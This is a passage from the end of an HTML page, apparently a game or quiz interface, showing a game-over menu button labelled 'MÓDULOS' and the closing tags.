                <button class="check-btn gameover-btn-menu" onclick="goToModules()">
                    <i class="fas fa-layer-group mr-2"></i> MÓDULOS
                </button>
            </div>
        </div>
    </div>
</body>
</html>
